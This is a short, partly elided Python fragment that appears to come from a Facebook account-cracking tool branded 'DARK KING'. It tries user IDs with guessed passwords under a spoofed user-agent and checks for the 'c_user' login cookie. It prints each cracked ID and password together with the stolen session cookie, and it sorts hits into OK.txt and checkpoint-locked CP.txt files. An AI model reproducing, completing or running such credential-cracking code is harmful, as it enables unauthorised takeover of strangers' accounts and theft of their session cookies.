...
def fuck():
    ...
    print(' [+] OK Ids saved in 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆/OK.txt')
    print(' [+] CP Ids saved in 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK] {uid}|{ps} \nCookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP] {cid}|{ps}")
